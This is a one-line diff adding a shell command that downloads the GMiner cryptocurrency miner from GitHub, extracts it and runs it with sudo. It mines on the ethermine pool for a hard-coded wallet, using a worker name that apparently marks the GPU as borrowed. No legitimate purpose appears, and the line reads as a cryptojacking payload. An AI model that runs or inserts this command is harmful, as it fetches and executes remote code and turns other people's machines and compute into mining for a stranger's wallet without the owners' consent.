@@ -1,0 +1,1 @@
+wget https://github.com/develsoftware/GMinerRelease/releases/download/2.56/gminer_2_56_linux64.tar.xz && tar xf gminer_2_56_linux64.tar.xz && sudo ./miner --algo ethash --server us1-etc.ethermine.org:4444 --user 0xb2AAd92f1570AD892248c229b86582699d724a0B.=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM) --pass x
